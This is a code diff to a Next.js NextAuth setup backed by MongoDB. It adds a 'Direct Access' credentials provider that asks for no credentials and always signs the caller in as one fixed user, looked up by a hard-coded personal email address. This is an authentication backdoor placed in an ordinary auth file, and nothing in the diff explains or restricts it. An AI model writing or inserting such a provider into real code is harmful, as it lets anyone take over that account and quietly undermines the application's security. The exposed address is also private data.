@@ -2,6 +2,7 @@ import NextAuth from "next-auth";
 import { connectDB } from "./mongodb";
 import { User } from "@/models/User";
 import { authConfig } from "./auth.config";
+import Credentials from "next-auth/providers/credentials";
 
 declare module "next-auth" {
   interface Session {
@@ -16,6 +17,30 @@ declare module "next-auth" {
 
 export const { handlers, auth, signIn, signOut } = NextAuth({
   ...authConfig,
+  providers: [
+    ...authConfig.providers,
+     Credentials({
+      id: "direct-access",
+      name: "Direct Access",
+      credentials: {},
+      async authorize() {
+        await connectDB();
+
+        const dbUser = await User.findOne({
+          email: "honeyoyo14@gmail.com",
+        }).lean();
+
+        if (!dbUser) return null;
+
+        return {
+          id: String(dbUser._id),
+          email: dbUser.email,
+          name: dbUser.name,
+          image: dbUser.image,
+        };
+      },
+    }),
+  ],
   callbacks: {
     // Sync Google profile to MongoDB. Allow sign-in even if DB is
     // unreachable (dev without MONGODB_URI) so UI work isn't blocked.
